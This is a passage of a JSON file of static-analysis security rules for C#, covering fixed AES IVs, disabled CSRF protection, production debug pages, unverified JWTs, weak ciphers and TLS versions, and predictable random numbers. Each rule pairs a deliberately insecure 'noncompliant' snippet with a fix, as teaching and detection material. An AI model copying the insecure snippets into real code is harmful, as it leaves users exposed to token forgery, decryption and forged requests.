Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)\n{\n    var aes = new AesCryptoServiceProvider();\n\n    byte[] iv     = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };\n    var encryptor = aes.CreateEncryptor(key, iv); // Noncompliant\n\n    var cryptoStream = new CryptoStream(target, encryptor, CryptoStreamMode.Write);\n    var swEncrypt    = new StreamWriter(cryptoStream);\n\n    swEncrypt.Write(dataToEncrypt);\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.IO;\nusing System.Security.Cryptography;\n\npublic void Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)\n{\n    var aes = new AesCryptoServiceProvider();\n\n    var encryptor = aes.CreateEncryptor(key, aes.IV);\n\n    var cryptoStream = new CryptoStream(target, encryptor, CryptoStreamMode.Write);\n    var swEncrypt    = new StreamWriter(cryptoStream);\n\n    swEncrypt.Write(dataToEncrypt);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/329\">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic void ConfigureServices(IServiceCollection services)\n{\n    // ...\n    services.AddControllersWithViews(options =&gt; options.Filters.Add(new IgnoreAntiforgeryTokenAttribute())); // Sensitive\n    // ...\n}\n</pre>\n<pre>\n[HttpPost, IgnoreAntiforgeryToken] // Sensitive\npublic IActionResult ChangeEmail(ChangeEmailModel model) =&gt; View(\"~/Views/...\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void ConfigureServices(IServiceCollection services)\n{\n    // ...\n    services.AddControllersWithViews(options =&gt; options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));\n    // or\n    services.AddControllersWithViews(options =&gt; options.Filters.Add(new ValidateAntiForgeryTokenAttribute()));\n    // ...\n}\n</pre>\n<pre>\n[HttpPost]\n[AutoValidateAntiforgeryToken]\npublic IActionResult ChangeEmail(ChangeEmailModel model) =&gt; View(\"~/Views/...\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers.</p>\n<p>The .Net Core framework offers multiple features which help during debug.\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in\nproduction.</p>\n<p>Use <code>if (env.IsDevelopment())</code> to disable debug code.</p>\n<h2>Sensitive Code Example</h2>\n<p>This rule raises issues when the following .Net Core methods are called:\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>\n<pre>\nusing Microsoft.AspNetCore.Builder;\nusing Microsoft.AspNetCore.Hosting;\n\nnamespace mvcApp\n{\n    public class Startup2\n    {\n        public void Configure(IApplicationBuilder app, IHostingEnvironment env)\n        {\n            // Those calls are Sensitive because it seems that they will run in production\n            app.UseDeveloperExceptionPage(); // Sensitive\n            app.UseDatabaseErrorPage(); // Sensitive\n        }\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nusing Microsoft.AspNetCore.Builder;\nusing Microsoft.AspNetCore.Hosting;\n\nnamespace mvcApp\n{\n    public class Startup2\n    {\n        public void Configure(IApplicationBuilder app, IHostingEnvironment env)\n        {\n            if (env.IsDevelopment())\n            {\n                // The following calls are ok because they are disabled in production\n                app.UseDeveloperExceptionPage(); // Compliant\n                app.UseDatabaseErrorPage(); // Compliant\n            }\n        }\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "csharpsquid:S5659": {
        "name": "JWT should be signed and verified with strong cipher algorithms",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in Jwt.Net</h2>\n<h3>Code examples</h3>\n<p>The following code contains an example of JWT decoding without verification of the signature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing JWT;\n\npublic static void decode(IJwtDecoder decoder)\n{\n    decoder.Decode(token, secret, verify: false); // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nusing JWT;\n\npublic static void decode()\n{\n    var jwt = new JwtBuilder()\n        .WithSecret(secret)\n        .Decode(token); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing JWT;\n\npublic static void decode(IJwtDecoder decoder)\n{\n    decoder.Decode(token, secret, verify: true);\n}\n</pre>\n<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nusing JWT;\n\npublic static void decode()\n{\n    var jwt = new JwtBuilder()\n        .WithSecret(secret)\n        .MustVerifySignature()\n        .Decode(token);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    var simpleDES = new DESCryptoServiceProvider(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    using (Aes aes = Aes.Create())\n    {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4212": {
        "name": "Serialization constructors should be secured",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>Because serialization constructors allocate and initialize objects, security checks that are present on regular constructors must also be present\non a serialization constructor. Failure to do so would allow callers that could not otherwise create an instance to use the serialization constructor\nto do this.</p>\n<p>This rule raises an issue when a type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or\ninterface, is declared in an assembly that allows partially trusted callers and has a constructor that takes a\n<code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object which is\nnot secured by a security check, but one or more of the regular constructors in the type is secured.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nusing System;\nusing System.IO;\nusing System.Runtime.Serialization;\nusing System.Runtime.Serialization.Formatters.Binary;\nusing System.Security;\nusing System.Security.Permissions;\n\n[assembly: AllowPartiallyTrustedCallersAttribute()]\nnamespace MyLibrary\n{\n    [Serializable]\n    public class Foo : ISerializable\n    {\n        private int n;\n\n        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]\n        public Foo()\n        {\n           n = -1;\n        }\n\n        protected Foo(SerializationInfo info, StreamingContext context) // Noncompliant\n        {\n           n = (int)info.GetValue(\"n\", typeof(int));\n        }\n\n        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)\n        {\n           info.AddValue(\"n\", n);\n        }\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nusing System;\nusing System.IO;\nusing System.Runtime.Serialization;\nusing System.Runtime.Serialization.Formatters.Binary;\nusing System.Security;\nusing System.Security.Permissions;\n\n[assembly: AllowPartiallyTrustedCallersAttribute()]\nnamespace MyLibrary\n{\n    [Serializable]\n    public class Foo : ISerializable\n    {\n        private int n;\n\n        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]\n        public Foo()\n        {\n           n = -1;\n        }\n\n        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]\n        protected Foo(SerializationInfo info, StreamingContext context)\n        {\n           n = (int)info.GetValue(\"n\", typeof(int));\n        }\n\n        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)\n        {\n           info.AddValue(\"n\", n);\n        }\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization </a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>These samples use TLSv1.0 as the default TLS algorithm, which is cryptographically weak.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Net;\n\npublic void encrypt()\n{\n    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls; // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nusing System.Net.Http;\nusing System.Security.Authentication;\n\npublic void encrypt()\n{\n    new HttpClientHandler\n    {\n        SslProtocols = SslProtocols.Tls // Noncompliant\n    };\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nUsing System.Net;\n\npublic void encrypt()\n{\n    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nusing System.Net.Http;\nusing System.Security.Authentication;\n\npublic void encrypt()\n{\n    new HttpClientHandler\n    {\n        SslProtocols = SslProtocols.Tls12\n    };\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>System.Random</code> class relies on a pseudorandom number generator, it should not be used for security-critical applications or for\nprotecting sensitive data. In such context, the <code>System.Cryptography.RandomNumberGenerator</code> class which relies on a cryptographically\nstrong random number generator (RNG) should be used in place.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Only use random number generators which are <a\n  href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation\">recommended by\n  OWASP</a> or any other trusted organization. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar random = new Random(); // Sensitive use of Random\nbyte[] data = new byte[16];\nrandom.NextBytes(data);\nreturn BitConverter.ToString(data); // Check if this value is used for hashing or encryption\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nusing System.Security.Cryptography;\n...\nvar randomGenerator = RandomNumberGenerator.Create(); // Compliant for security-sensitive use cases\nbyte[] data = new byte[16];\nrandomGenerator.GetBytes(data);\nreturn BitConverter.ToString(data);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5753": {
        "name": "Disabling ASP.NET \"Request Validation\" feature is security-sensitive",
